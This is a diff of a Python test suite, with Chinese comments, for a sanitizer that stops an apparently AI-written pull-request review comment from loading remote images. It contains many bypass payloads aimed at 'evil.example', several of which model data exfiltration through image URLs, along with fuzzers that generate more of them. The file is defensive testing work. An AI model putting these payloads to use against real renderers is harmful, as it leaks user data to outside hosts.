@@ -65,7 +65,18 @@ CHANGED
             fi
             if [ "$1" = "pr" ] && [ "$2" = "view" ]; then
               [ -f "{tmp_path.as_posix()}/gh-view-fail" ] && {{ echo "HTTP 502" >&2; exit 1; }}
-              [ -f "{tmp_path.as_posix()}/gh-view.txt" ] && cat "{tmp_path.as_posix()}/gh-view.txt"
+              # gh-comments.txt：每行「作者login<TAB>留言內容」。模擬 --jq 的作者篩選：
+              # 只有在 jq 式子真的寫了 select(.author.login=="github-actions" …) 時才只回 bot 的留言，
+              # 否則回全部——workflow 若拿掉篩選，「偽造標記」的測試就會失敗。
+              if [ -f "{tmp_path.as_posix()}/gh-comments.txt" ]; then
+                case "$*" in
+                  *'select(.author.login=="github-actions"'*)
+                    while IFS=$'\\t' read -r login body; do
+                      case "$login" in github-actions|'github-actions[bot]') printf '%s\\n' "$body";; esac
+                    done < "{tmp_path.as_posix()}/gh-comments.txt";;
+                  *) cut -f2- "{tmp_path.as_posix()}/gh-comments.txt";;
+                esac
+              fi
               exit 0
             fi
             exit 0
@@ -386,9 +397,14 @@ def test_leak_check_blocks_jwt_shape(tmp_path):
     assert jwt not in res.stdout + res.stderr
 
 
-# ------------------------------------------------------- 外部圖片移除
-
-IMG_PLACEHOLDER = "[已移除外部圖片]"
+# ------------------------------------------------------- 外部圖片中和
+#
+# fix round 4 的規則（刻意簡單）：
+#   - 唯一的豁免是「乾淨的頂層 fenced code block」：整份文件只有散文＋行首、不縮排、有關好、
+#     info string 單純且不是 GitHub 會渲染的語言（mermaid 等）的 fence 時，fence 內一字不改；
+#   - 文件裡只要出現引言、清單、註腳定義、行首的 <、任何縮排行、或任何不合格的 fence，
+#     整份文件就沒有豁免；
+#   - 沒被豁免的地方（含行內 code）每個 `![` 都加反斜線、圖片／嵌入類標籤的 `<` 都改成 &lt;。
 
 
 def _posted_comment(tmp_path: Path, body: str) -> str:
@@ -402,7 +418,8 @@ def _posted_comment(tmp_path: Path, body: str) -> str:
 import re as _re
 
 _UNESCAPED_IMG = _re.compile(r"(?<!\\)!\[")
-_HTML_IMG = _re.compile(r"<(img|image|source|video|picture|audio|svg)\b", _re.I)
+_HTML_IMG = _re.compile(
+    r"<(img|image|picture|source|video|audio|track|embed|object|iframe|svg|math|input|link|meta|base)", _re.I)
 
 
 def _assert_no_image(out: str):
@@ -425,12 +442,10 @@ def test_remote_images_are_neutralized(tmp_path):
         "一般連結 [link](https://example.com) 要保留\n"
     )
     out = _posted_comment(tmp_path, body)
-    # 同一行的圖片換成固定文字；HTML block 裡與跨行的只跳脫（換掉會刪到結構字元，見 strip_images）
-    assert out.count(IMG_PLACEHOLDER) >= 1, out
     _assert_no_image(out)
     assert not _rendered_fetching_tags(out), out
-    # 同一行的 inline 圖片整段換掉；HTML block 裡的 <img …> 只跳脫成文字（網址留在文字裡不會被抓）
-    assert "](https://evil.example/?d=AAAA)" not in out, out
+    # 只跳脫、不刪字元：網址會以文字留在留言裡，但不會被自動抓取
+    assert "!\\[x](https://evil.example/?d=AAAA)" in out, out
     assert '&lt;img src="https://evil.example/x">' in out, out
     assert "[link](https://example.com)" in out, "一般連結不會被自動抓取，必須保留"
 
@@ -452,27 +467,93 @@ NONSTD_WS_CASES = [
 ]
 
 
-# --- 程式碼不能被改（fix round 2）
+# --- 豁免：散文＋乾淨的頂層 fence，fence 內一字不改
 
-RUST_FENCE = "```rust\nlet v = vec![1, 2];\nlet f = vec![x][0];\n```\n"
-JSX_FENCE = '```tsx\nconst A = () => <img src={logo} alt="x" />;\n```\n'
+RUST_FENCE = "```rust\nlet v = vec![1, 2];\nlet f = vec![x][0];\nassert!(matches!(x, [..]));\n```\n"
+JSX_FENCE = '```tsx\nconst A = () => <img src={logo} />;\n```\n'
+PLAIN_REVIEW = (
+    "## 這個 PR 做了什麼\n改了解析流程，見 [文件](https://example.com/doc)。\n\n"
+    + RUST_FENCE
+    + "\n**問題是什麼** → 少了 alt；`a < b` 的判斷沒問題。\n\n"
+    + JSX_FENCE
+    + "\n## 結論\n可以合 ✅\n"
+)
 
 
 @pytest.mark.parametrize(
     "body",
     [
+        PLAIN_REVIEW,
         RUST_FENCE,
+        JSX_FENCE,
         "~~~\nlet v = vec![1, 2];\n~~~\n",
         "````md\n```\nvec![x][0]\n```\n````\n",          # 外層較長的 fence 包住內層
-        "用 `vec![1, 2]` 與 `vec![x][0]` 即可\n",
-        "用 ``vec![x][0]`` 也行\n",
-        JSX_FENCE,
-        "JSX 寫成 `<img src={logo} alt=\"x\" />`\n",
         "前文\n\n" + RUST_FENCE + "\n後文 [link](https://example.com)\n",
+        # fence「裡面」的縮排、清單符號、>、< 都是程式碼，不算疑慮
+        "```yaml\n- a: vec![1]\n  b:\n    - <img src=x>\n> q\n\tt\n```\n",
+        "```\nvec![1]\n```",                               # 結尾沒有換行
     ],
 )
-def test_code_is_left_byte_for_byte(tmp_path, body):
+def test_clean_top_level_fences_are_left_byte_for_byte(tmp_path, body):
     _same(body, _posted_comment(tmp_path, body))
+    assert _neutralizer_module()["neutralize"](body) == body
+
+
+def test_inline_code_is_escaped_accepted_cost():
+    """行內 code 不豁免：`vec![1]` 會多一個反斜線、`<img …>` 會變成 &lt;img（已接受的代價）。"""
+    neutralize = _neutralizer_module()["neutralize"]
+    assert neutralize("用 `vec![1]` 即可\n") == "用 `vec!\\[1]` 即可\n"
+    assert neutralize("JSX 寫成 `<img src={logo} />`\n") == "JSX 寫成 `&lt;img src={logo} />`\n"
+
+
+@pytest.mark.parametrize(
+    "extra, why",
+    [
+        ("- 項目一\n", "清單"),
+        ("* 項目一\n", "清單（*）"),
+        ("1. 第一點\n", "有序清單"),
+        ("2) 第二點\n", "有序清單（括號）"),
+        ("> 引言\n", "引言"),
+        ("<details>\n", "行首的 <（可能是 HTML block）"),
+        ("x[^1]\n\n[^1]: 註腳\n", "註腳定義"),
+        ("    四格縮排\n", "縮排行"),
+        (" 一格縮排\n", "縮排行（1 格也算）"),
+        ("\ttab 縮排\n", "tab 縮排"),
+        ("~~~~\n沒關的 fence（後面的 ``` 與較短的 ~~~ 都關不掉它）\n", "沒關的 fence"),
+        (" ```\nx\n ```\n", "縮排的 fence"),
+        ("```\nx\n  ```\n", "收尾 fence 有縮排"),
+        ("```js title\nx\n```\n", "info string 不單純"),
+        ("```mermaid\ngraph TD\n```\n", "GitHub 會渲染的語言"),
+        ("```GeoJSON\n{}\n```\n", "GitHub 會渲染的語言（不分大小寫）"),
+        ("~~~math\nx\n~~~\n", "GitHub 會渲染的語言（~~~）"),
+    ],
+)
+def test_any_doubt_removes_exemption_for_whole_document(extra, why):
+    """文件裡只要有一處讓頂層結構不確定，整份文件的 fence 都不豁免（文件化的行為）。"""
+    neutralize = _neutralizer_module()["neutralize"]
+    for body in (PLAIN_REVIEW + "\n" + extra, extra + "\n" + PLAIN_REVIEW):
+        out = neutralize(body)
+        assert "let v = vec!\\[1, 2];" in out, f"{why}: {out!r}"
+        assert "&lt;img src={logo} />" in out, f"{why}: {out!r}"
+        assert "matches!(x, [..])" in out, "沒有 `![` 的程式碼不會被動到"
+        _assert_no_image(out)
+        assert not _rendered_fetching_tags(out), f"{why}: {out!r}"
+
+
+def test_mermaid_fence_is_not_exempt_and_not_rendered():
+    """mermaid 支援圖片節點；GitHub 會渲染 mermaid／geojson／topojson／stl／math 的 fence。"""
+    body = (
+        "流程如下\n\n```mermaid\nflowchart TD\n"
+        '  A@{ img: "https://evil.example/m.png", label: "x" }\n'
+        "  B[\"<img src='https://evil.example/n.png'>\"]\n```\n\n" + RUST_FENCE
+    )
+    out = _neutralizer_module()["neutralize"](body)
+    assert "```mermaid" not in out and "```text mermaid" in out, out
+    assert "<img" not in out
+    assert "vec!\\[1, 2]" in out, "有 mermaid fence 的文件整份不豁免"
+    assert not _rendered_fetching_tags(out), out
+    # 量測工具本身要看得到「會被渲染的語言」
+    assert _rendered_fetching_tags("```mermaid\ngraph TD\n```\n") == ["lang"] * len(_RENDER_OPTS)
 
 
 @pytest.mark.parametrize(
@@ -533,6 +614,26 @@ def test_images_outside_code_never_survive(tmp_path, body):
         ("<img/src=x>\n<!--a\n<img x]-->```<img/src=x>\n\nword ```<video poster=https://evil.example/a>```\n",
          "替換範圍吃到 --> 會讓後面變成 raw HTML"),
         ("![a](u\n\n)```<img src=https://evil.example/a>```\n", "跨空行的替換會併掉段落"),
+        # fix round 4：第三輪 review 的獨立 fuzzer 找到的（round 3 的實作原樣輸出、渲染出圖片）
+        ("> | `a | ![x](https://ev.il/s) | b` |\n> |---|---|---|\n", "引言裡的表格"),
+        ("x[^1]\n\n[^1]: <pre>\n\n    `<img src=https://ev.il/s>`\n", "註腳定義裡的 HTML block"),
+        ("x[^1]\n\n[^1]:<script>\n\n    ``<IMG SRC='https://ev.il/s'/>``\n", "註腳定義裡的 <script>"),
+        ("x[^1]\n\n[^1]:<!X\n    | --- | :-: |\n\n    | `a | ![*a*](https://ev.il/s 't') | b` |\n", "註腳＋宣告＋表格"),
+        ("- | `a | <video poster=https://ev.il/s></video> | b` |\n  |-|-|-|\n", "清單裡的表格"),
+        ("```mermaid\ngraph TD\n  A[\"<img src='https://ev.il/s'>\"]\n```\n", "mermaid fence"),
+        ("<embed src=https://ev.il/s>\n<object data=https://ev.il/s></object>\n"
+         "<iframe src=https://ev.il/s></iframe>\n<input type=image src=https://ev.il/s>\n", "嵌入類標籤"),
+        ("```\nx\n   ```\n![x](https://ev.il/s)\n```\ny\n```\n", "縮排的收尾 fence 讓兩邊開關錯開"),
+        ("```\nx\n````\n![x](https://ev.il/s)\n```\n", "較長的收尾"),
+        ("~~~\nx\n```\n~~~\n![x](https://ev.il/s)\n", "不同字元不收尾"),
+        ("foo\n```rust\n![x](https://ev.il/s)\n", "fence 打斷段落但沒關"),
+        ("   ```\n```\n<img src=https://ev.il/s>\n```\n```\n", "縮排的開頭 fence 讓後面的開關整個錯開"),
+        ("<div>\n```\n<img src=https://ev.il/s>\n```\n", "HTML block 裡的行首 fence 不是程式碼"),
+        # cmark 只會去掉一個開頭的 BOM：只去一個的話，第一行在這裡看不是 <div>、在 GitHub 看是
+        (BOM + "<div>\n```\n<img src=https://ev.il/s>\n```\n", "BOM 後面的 HTML block"),
+        (BOM + BOM + "<div>\n```\n<img src=https://ev.il/s>\n```\n", "兩個 BOM 後面的 HTML block"),
+        ("x\r```\r<img src=https://ev.il/s>\r```\r", "只有 CR 的行尾"),
+        ("```&#109;ermaid\ngraph TD\n```\n", "info string 裡的 entity 會被 cmark 解開成 mermaid"),
     ]
     + NONSTD_WS_CASES,
 )
@@ -576,42 +677,55 @@ def _neutralizer_module() -> dict:
     return ns
 
 
-def test_neutralizer_is_linear_on_pathological_input():
-    import time
-
-    ns = _neutralizer_module()
-    evil = "![" * 50_000 + "<img " * 50_000 + "`" * 3 + "[" * 20_000 + "(" * 20_000
-    t = time.perf_counter()
-    out = ns["neutralize"](evil)
-    assert time.perf_counter() - t < 2.0
+@pytest.mark.parametrize(
+    "name, evil",
+    [
+        ("html 註解開頭", "<!--\n" * 40_000),                     # round 3 的 pending 清單：80 KB 要 11 秒
+        ("很深的 label", "![ " * 44_000 + "]" * 44_000),          # round 2：約 31 秒
+        ("反引號", "`" * 200_000),
+        ("img 標籤", "<img " * 40_000),
+        ("很多 fence", "```\n" * 50_000),
+        ("沒關的 fence", "```\n" + "x\n" * 99_000),
+        ("fence 後接很多空白", ("```" + " " * 5_000 + "!\n") * 39),
+        ("數字開頭", "1" * 199_000 + "\n```\nx\n```\n"),
+        ("混合", "`a` ![x](y) `` b `` <img z> ```mermaid " * 5_000),
+    ],
+)
+def test_neutralizer_is_linear_on_pathological_input(name, evil):
+    assert len(evil.encode("utf-8")) <= 200_000, "要在 200 KB 上限內才有意義"
+    neutralize = _neutralizer_module()["neutralize"]
+    t = _time.perf_counter()
+    out = neutralize(evil)
+    elapsed = _time.perf_counter() - t
+    assert elapsed < 1.0, f"{name}: {elapsed:.2f}s"
     _assert_no_image(out)
-    many = "`a` ![x](y) `` b `` <img z> " * 5_000
-    t = time.perf_counter()
-    out = ns["neutralize"](many)
-    assert time.perf_counter() - t < 2.0
-    _assert_no_image(out)
-    # fix round 3：巨大 label（![ 很深、] 很多）原本因為每個候選 label 都做正規化而要 ~31 秒
-    deep = "![ " * 44_000 + "]" * 44_000
-    t = time.perf_counter()
-    out = ns["neutralize"](deep)
-    assert time.perf_counter() - t < 2.0
-    _assert_no_image(out)
 
 
-# ------------------------------------------------------- 用 GitHub 的 parser 做差分測試（fix round 3）
+# ------------------------------------------------------- 用 GitHub 的 parser 做差分測試
 #
 # cmarkgfm 是 github/cmark-gfm 的 Python binding，只在測試用（requirements.txt），
 # workflow 執行時不需要。把 neutralize() 的「輸出」用 GitHub 風格設定渲染（GFM 擴充全開、
-# 允許 raw HTML），再用 html.parser 解析：渲染結果裡不能有任何會抓圖的元素。
+# 允許 raw HTML），再檢查渲染結果，下列任一種出現就算失敗：
+#   1. html.parser 解析到會抓資源的元素（img／picture／source／video／audio／embed／object／iframe，
+#      另外加 image、svg、type=image 的 input）；
+#   2. 渲染後的 HTML 原文裡有這些標籤的開頭（html.parser 與瀏覽器對沒關的註解／宣告看法可能不同，
+#      用原文比對補上，偏向多報）；
+#   3. 有 code block 的語言是 GitHub 會渲染的（mermaid／geojson／topojson／stl／math）——
+#      cmark 只會把它當程式碼，這一項是替「GitHub 之後會再渲染它」把關。
 # 裝不起來時測試要失敗（import 錯誤），不能 skip。
+import time as _time  # noqa: E402
+
 import cmarkgfm  # noqa: E402
 from cmarkgfm.cmark import Options as _CmarkOpts  # noqa: E402
 from html.parser import HTMLParser  # noqa: E402
 
-_FETCHING_TAGS = {"img", "image", "picture", "source", "video", "audio", "svg"}
+_FETCHING_TAGS = {"img", "image", "picture", "source", "video", "audio", "embed", "object", "iframe", "svg"}
+_RAW_FETCHING = _re.compile(r"<(?:img|image|picture|source|video|audio|embed|object|iframe|svg)\b", _re.I)
+_RENDERED_LANG = _re.compile(r'(?:class="language-|lang=")[^"]*(?:mermaid|geojson|topojson|stl|math)', _re.I)
 _RENDER_OPTS = [
     _CmarkOpts.CMARK_OPT_UNSAFE,
     _CmarkOpts.CMARK_OPT_UNSAFE | _CmarkOpts.CMARK_OPT_LIBERAL_HTML_TAG | _CmarkOpts.CMARK_OPT_FOOTNOTES,
+    _CmarkOpts.CMARK_OPT_UNSAFE | _CmarkOpts.CMARK_OPT_FOOTNOTES | _CmarkOpts.CMARK_OPT_GITHUB_PRE_LANG,
 ]
 
 
@@ -623,6 +737,8 @@ class _TagCollector(HTMLParser):
     def handle_starttag(self, tag, attrs):
         if tag in _FETCHING_TAGS:
             self.found.append(tag)
+        elif tag == "input" and (dict(attrs).get("type") or "").lower() == "image":
+            self.found.append("input[type=image]")  # 清單的核取方塊是 type=checkbox，不算
 
     handle_startendtag = handle_starttag
 
@@ -630,10 +746,13 @@ class _TagCollector(HTMLParser):
 def _rendered_fetching_tags(md: str) -> list[str]:
     found: list[str] = []
     for opts in _RENDER_OPTS:
+        html = cmarkgfm.github_flavored_markdown_to_html(md, options=opts)
         p = _TagCollector()
-        p.feed(cmarkgfm.github_flavored_markdown_to_html(md, options=opts))
+        p.feed(html)
         p.close()
         found += p.found
+        found += ["raw:" + m.lower() for m in _RAW_FETCHING.findall(html) if not p.found]
+        found += ["lang"] * bool(_RENDERED_LANG.search(html))
     return found
 
 
@@ -642,7 +761,14 @@ def test_differential_harness_detects_images():
     assert _rendered_fetching_tags("![x](https://e/a)")
     assert _rendered_fetching_tags("<div>\n<img src=x>\n</div>\n")
     assert _rendered_fetching_tags("<image src=x>")
+    assert _rendered_fetching_tags("<!X\n<source src=x>\n"), "宣告／註解裡的標籤用原文比對抓"
+    # <iframe> 不在這裡：GFM 的 tagfilter 擴充本來就會把它轉成文字（_FETCHING_TAGS 仍列著，多一層）
+    for tag in ("embed src=x", "object data=x", "input type=image src=x", "video poster=x"):
+        assert _rendered_fetching_tags(f"<{tag}>"), tag
+    assert _rendered_fetching_tags("~~~ Mermaid\ngraph TD\n~~~\n")
     assert not _rendered_fetching_tags("`<img src=x>` 與 !\\[x](y) 與 &lt;img src=x>")
+    assert not _rendered_fetching_tags("- [ ] 核取方塊不是圖片\n\n```text mermaid\nx\n```\n")
+    assert not _rendered_fetching_tags(RUST_FENCE + JSX_FENCE)
 
 
 def _all_bypass_cases() -> list[str]:
@@ -670,15 +796,10 @@ def test_differential_all_bypass_cases_render_no_images():
     assert not bad, "\n".join(f"{d!r} -> {t}" for d, t in bad)
 
 
-def test_differential_code_still_preserved():
-    ns = _neutralizer_module()
-    for body in (RUST_FENCE, JSX_FENCE, "用 `vec![1, 2]` 與 `vec![x][0]` 即可\n",
-                 "JSX 寫成 `<img src={logo} alt=\"x\" />`\n"):
-        assert ns["neutralize"](body) == body
-
-
 FUZZ_SEED = 20261120
 FUZZ_DOCS = 20_000
+STRUCT_FUZZ_SEED = 20261121
+STRUCT_FUZZ_DOCS = 20_000
 _FUZZ_FRAGMENTS = [
     # 圖片語法
     "![a](https://evil.example/i)", "![a][r]", "![a][]", "![r]", "[r]: https://evil.example/d",
@@ -702,12 +823,13 @@ _FUZZ_FRAGMENTS = [
 ]
 
 
-def _fuzz_docs():
+def _fragment_docs(seed: int, count: int):
+    """片段 fuzzer：把上面的片段隨機相接。"""
     import random
 
-    rng = random.Random(FUZZ_SEED)
+    rng = random.Random(seed)
     eols = ["\n", "\r\n", "\r", "\n\n"]
-    for k in range(FUZZ_DOCS):
+    for k in range(count):
         if k % 2 == 0:  # 片段直接相接
             yield "".join(rng.choice(_FUZZ_FRAGMENTS) for _ in range(rng.randint(1, 16)))
         else:  # 以行為單位：每行 1–6 個片段，接隨機行尾（讓 fence／HTML block／空行更常出現在行首）
@@ -715,21 +837,183 @@ def _fuzz_docs():
                           + rng.choice(eols) for _ in range(rng.randint(1, 8)))
 
 
-def test_differential_fuzz_no_image_ever_renders():
-    ns = _neutralizer_module()
-    neutralize = ns["neutralize"]
+# --- 結構化 fuzzer（fix round 4）
+#
+# 片段 fuzzer 很少碰巧產生「容器前綴連續好幾行」的文件，第三輪 review 的兩個繞過（引言裡的表格、
+# 註腳定義裡的 HTML block）就是這樣漏掉的。這個 fuzzer 以行為單位，讓同一個容器前綴跨行延續，
+# 行的內容從表格、各型 HTML block 開頭／結尾、各種縮排／長度／info string 的 fence、行內 code
+# 包住的 payload 裡挑；另外有一種「看起來乾淨」的文件專門打豁免路徑（頂層 fence 配各種收尾）。
+_EVIL = "https://evil.example/s"
+_S_PAYLOADS = [
+    f"![a]({_EVIL})", f'![a](<{_EVIL}> "t")', f"**![a]({_EVIL})**", f"[![a]({_EVIL})](https://l.example)",
+    "![a][r1]", "![r1]", "![r1][]", "![ R1 ]",
+    f"<img src={_EVIL}>", f"<IMG SRC='{_EVIL}'/>", f"<img\tsrc={_EVIL}>", f"<img/src={_EVIL}>",
+    f"<picture><source srcset={_EVIL}>", f"<video poster={_EVIL}></video>", f"<audio src={_EVIL}>",
+    f"<svg><image href={_EVIL}/></svg>", f"<image src={_EVIL}>", f"<input type=image src={_EVIL}>",
+    f"<embed src={_EVIL}>", f"<object data={_EVIL}></object>", f"<iframe src={_EVIL}></iframe>",
+    "<img", "<source", "![", "!", "[", "]", "(", ")",
+]
+# (第一行的前綴, 之後各行的前綴)
+_S_CONTAINERS = [
+    ("> ", "> "), (">", ">"), ("> > ", "> > "), ("- ", "  "), ("* ", "  "), ("+ ", "  "),
+    ("1. ", "   "), ("2) ", "   "), ("- [ ] ", "  "), ("[^1]: ", "    "), ("[^1]:", "    "),
+    ("* > ", "  > "), ("> - ", ">   "), ("> 1. ", ">    "), ("   ", "   "), ("    ", "    "), ("\t", "\t"),
+    ("", ""), ("", ""), ("", ""),
+]
+_S_HTML = [
+    # CommonMark HTML block 開頭 type 1–7，與各自的結束記號
+    "<pre>", "<script>", "<style>", "<textarea>", "<!--", "<?php", "<!DOCTYPE x", "<!X", "<![CDATA[",
+    "<div>", "<details>", "<summary>", "<table>", "<tr><td>", "<p>", "<x-y>", "</div>", '<a href="x">',
+    "</pre>", "</script>", "</style>", "</textarea>", "-->", "?>", "]]>", "</details>", "</td></tr></table>",
+]
+_S_FENCE_INDENT = ["", "", "", " ", "  ", "   ", "    ", "\t"]
+_S_FENCE_RUN = ["```", "```", "````", "`````", "~~~", "~~~", "~~~~"]
+_S_FENCE_INFO = [
+    "", "", "", "rust", "tsx", "c++", "text", " js", "js x", "a`b", "{.x}", "x" * 21, "~~~", "```",
+    "mermaid", "Mermaid", " MERMAID", "mermaid x", "geojson", "topojson", "stl", "math", "  \t",
+    # cmark 會解開 info string 裡的 entity 與反斜線跳脫
+    "&#109;ermaid", "m&#x65;rmaid", "mer\\maid", "\\mermaid", "x-mermaid", "mermaid,x", "{mermaid}", "\tmath",
+]
+_S_LINES = [
+    "| `a | {P} | b` |", "|---|---|---|", "|-|-|-|", "| --- | :-: |", "| a | b |", "`x|{P}|y`", "-|-",
+    "`{P}`", "``{P}``", "``` {P} ```", "w `a` `{P}` b", "`a` {P}", "{P}", "<summary>`{P}`</summary>",
+    '[r1]: <https://evil.example/d> "ti`tle"', "[r1]:", "===", "---", "***", "# h", "text", "vec![1]",
+    'A@{ img: "https://evil.example/m" }', "$`{P}`$", "https://e.example/d```{P}```", "\\`{P}`",
+]
+_S_NOISE = ["`", "``", "```", "\\", "\\`", "&#96;", "&lt;", "|", "$", "~", "<!-- ` -->", "<b>", "x",
+            IDSP, NBSP, "\f", "\v", "\x85", LSEP, PSEP, "\x1c", "\x1d", "\x1e", BOM, "\x00", "\x1b", " ", "\t"]
+_S_EOLS = ["\n", "\n", "\n", "\n", "\r\n", "\r", "  \n", "\\\n", "\n\n", "\n\n", "\n \n", "\n\t\n",
+           "\n" + IDSP + "\n"]
+
+
+def _structured_line(rng) -> str:
+    kind = rng.random()
+    if kind < 0.45:
+        return rng.choice(_S_LINES).replace("{P}", rng.choice(_S_PAYLOADS))
+    if kind < 0.65:
+        return rng.choice(_S_HTML) + (rng.choice(_S_PAYLOADS) if rng.random() < 0.3 else "")
+    if kind < 0.9:
+        return rng.choice(_S_FENCE_INDENT) + rng.choice(_S_FENCE_RUN) + rng.choice(_S_FENCE_INFO)
+    return ""
+
+
+def _fence_soup_doc(rng) -> str:
+    """幾乎都是行首 fence 與 payload 的短文件，偶爾插一行會讓開關錯開的東西（縮排的 fence、HTML block 開頭…）。
+
+    豁免規則裡「有疑慮就整份不豁免」那一半要靠這種文件才測得到：拿掉任何一條疑慮規則，這裡都要有文件失敗。
+    """
+    fence = rng.choice(["```", "```", "```", "~~~", "````"])
+    trouble = [
+        " " + fence, "  " + fence, "   " + fence, "    " + fence, "\t" + fence, "> " + fence, ">" + fence,
+        "- " + fence, "* " + fence, "1. " + fence, "2) " + fence, "[^1]: " + fence, "[^1]:\n    " + fence,
+        "<div>", "<pre>", "<!--", "<script>", "<style>", "<textarea>", "<?", "<!X", "<![CDATA[", "<details>",
+        "<x-y>", "</div>", "<table>", "-->", "</pre>", fence + "x y", fence + "mermaid", fence + fence[0],
+        fence[:-1], "```", "~~~", "> x", "- x", "    x", "x" + fence, "x[^1]", "", "text", "|---|---|",
+        BOM + fence, "\x1c" + fence, LSEP + fence, NBSP + fence,
+    ]
+    payload = lambda: rng.choice(_S_PAYLOADS[:21])  # noqa: E731 — 只取完整的圖片／標籤
+    lines = [rng.choice(trouble)] if rng.random() < 0.7 else []
+    for _ in range(rng.randint(1, 3)):
+        lines += [fence + rng.choice(["", "", "rust"]), payload(), fence]
+        if rng.random() < 0.5:
+            lines.append(payload())
+    lines = [rng.choice(trouble) if rng.random() < 0.12 else line for line in lines]
+    return "".join(line + rng.choice(["\n", "\n", "\n", "\n", "\r\n", "\r", "\n\n"]) for line in lines)
+
+
+def _clean_looking_doc(rng) -> str:
+    """散文＋頂層 fence，專打豁免路徑：fence 內放 payload，收尾有各種對／不對的變化。"""
+    if rng.random() < 0.5:
+        return _fence_soup_doc(rng)
+    out = []
+    for _ in range(rng.randint(1, 4)):
+        if rng.random() < 0.6:
+            out.append(rng.choice(["說明文字", "## 標題", "**粗體** 開頭", "text " + rng.choice(_S_PAYLOADS),
+                                   "| a | b |", "|---|---|", "===", "---"]) + rng.choice(_S_EOLS))
+        run = rng.choice(_S_FENCE_RUN)
+        info = rng.choice(_S_FENCE_INFO) if rng.random() < 0.5 else rng.choice(["", "rust", "tsx"])
+        out.append(run + info + rng.choice(["\n", "\n", "\r\n", "\r"]))
+        for _ in range(rng.randint(0, 4)):
+            body = rng.choice([
+                rng.choice(_S_PAYLOADS), "  " + rng.choice(_S_PAYLOADS), "- " + rng.choice(_S_PAYLOADS),
+                "> x", "", "<div>", "<!--", "```", "~~~", " " + run, "   " + run + run[0], "    " + run,
+                "\t" + run, run + " x", run[:-1], rng.choice(_S_NOISE) + run, "vec![1]",
+            ])
+            out.append(body + rng.choice(_S_EOLS))
+        closer = rng.random()
+        if closer < 0.6:
+            out.append(run + rng.choice(["", "", " ", "\t ", run[0]]) + rng.choice(["\n", "\n", "\r\n", "\r", ""]))
+        elif closer < 0.85:
+            out.append(rng.choice([" ", "  ", "   ", "    ", "\t", rng.choice(_S_NOISE)]) + run + "\n")
+        out.append(rng.choice(["", "", rng.choice(_S_PAYLOADS) + "\n", "`" + rng.choice(_S_PAYLOADS) + "`\n"]))
+        if rng.random() < 0.1:  # 偶爾混進一行會讓整份失去豁免的東西
+            out.append(rng.choice(_S_CONTAINERS)[0] + rng.choice(_S_HTML + ["x"]) + "\n")
+    return "".join(out)
+
+
+def _structured_docs(seed: int, count: int):
+    import random
+
+    rng = random.Random(seed)
+    for _ in range(count):
+        if rng.random() < 0.4:
+            yield _clean_looking_doc(rng)
+            continue
+        first, cont = rng.choice(_S_CONTAINERS)
+        lines = []
+        for k in range(rng.randint(1, 8)):
+            if k == 0:
+                prefix = first
+            else:  # 多數時候延續同一個容器，偶爾換容器或掉出去（lazy continuation）
+                prefix = cont if rng.random() < 0.8 else rng.choice(_S_CONTAINERS)[0]
+            line = _structured_line(rng)
+            if rng.random() < 0.15:
+                line = rng.choice(_S_NOISE) + line
+            lines.append(prefix + line + rng.choice(_S_EOLS))
+        if rng.random() < 0.5:
+            lines.insert(0, "x[^1]\n\n")  # 讓 [^1]: 成為真的註腳定義
+        yield "".join(lines)
+
+
+def _fuzz_failures(docs, limit: int = 5) -> list:
+    """回傳 [(序號, 文件, 輸出, 命中)]；給 CI 的兩個 fuzz 測試與本機的大量 fuzz 共用。"""
+    neutralize = _neutralizer_module()["neutralize"]
     failures = []
-    for i, doc in enumerate(_fuzz_docs()):
+    for i, doc in enumerate(docs):
         out = neutralize(doc)
         tags = _rendered_fetching_tags(out)
         if tags:
             failures.append((i, doc, out, tags))
-            if len(failures) >= 5:
+            if len(failures) >= limit:
                 break
+    return failures
+
+
+@pytest.mark.parametrize(
+    "name, seed, count, gen",
+    [("fragment", FUZZ_SEED, FUZZ_DOCS, _fragment_docs),
+     ("structured", STRUCT_FUZZ_SEED, STRUCT_FUZZ_DOCS, _structured_docs)],
+)
+def test_differential_fuzz_no_image_ever_renders(name, seed, count, gen):
+    failures = _fuzz_failures(gen(seed, count))
     assert not failures, (
-        f"seed={FUZZ_SEED} 失敗 {len(failures)} 件，第一件：#{failures[0][0]} "
+        f"{name} fuzzer seed={seed} 失敗 {len(failures)} 件，第一件：#{failures[0][0]} "
         f"doc={failures[0][1]!r} out={failures[0][2]!r} tags={failures[0][3]}"
     )
+
+
+def test_fuzz_corpora_actually_contain_images_and_exempt_fences():
+    """語料要打得到東西：未處理時多數會渲染出圖片，而且有一部分文件真的走到豁免路徑。"""
+    neutralize = _neutralizer_module()["neutralize"]
+    for gen, seed in ((_fragment_docs, FUZZ_SEED), (_structured_docs, STRUCT_FUZZ_SEED)):
+        docs = list(gen(seed, 2_000))
+        assert sum(bool(_rendered_fetching_tags(d)) for d in docs) > 500
+    # 輸出裡還有原樣的 `![` 或圖片類標籤，只可能是在被豁免的 fence 裡
+    exempted = sum(
+        1 for out in map(neutralize, _structured_docs(STRUCT_FUZZ_SEED, 2_000))
+        if "![" in out or _HTML_IMG.search(out)
+    )
+    assert exempted > 20, f"結構化語料裡只有 {exempted} 份保留了 fence 內的 payload，豁免路徑沒被測到"
 
 
 # ------------------------------------------------------- Claude 失敗時 fail closed
@@ -753,13 +1037,40 @@ def test_failclosed_labels_comments_and_removes_output(tmp_path):
     assert not (tmp_path / "comment.md").exists()
 
 
-def test_failclosed_does_not_repeat_comment(tmp_path):
-    (tmp_path / "gh-view.txt").write_text(f"舊的\n{FAILED_MARKER}\nAI review 沒有完成\n", encoding="utf-8")
-    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
-    assert res.returncode == 0, res.stderr
+def _existing_comments(tmp_path: Path, *comments: tuple[str, str]):
+    """PR 上既有的留言：(作者 login, 內容)。內容裡的換行以空格代替（假 gh 一行一則）。"""
+    (tmp_path / "gh-comments.txt").write_text(
+        "".join(f"{login}\t{body}\n" for login, body in comments), encoding="utf-8", newline="\n"
+    )
+
+
+def _run_failclosed_path(tmp_path: Path, step: str):
+    """兩條會貼「AI review 沒有完成」的路徑：Claude 步驟失敗、貼留言 step 內的 fail_closed（用過大輸出觸發）。"""
+    if step == VERDICT_STEP:
+        (tmp_path / "review-output.md").write_text("a" * 300_000 + "\nNEEDS_WORK: no\n", encoding="utf-8")
+    return _run(_step_script(step), tmp_path, _fake_gh(tmp_path), {})
+
+
+@pytest.mark.parametrize("step", [FAILCLOSED_STEP, VERDICT_STEP])
+@pytest.mark.parametrize("login", ["github-actions", "github-actions[bot]"])
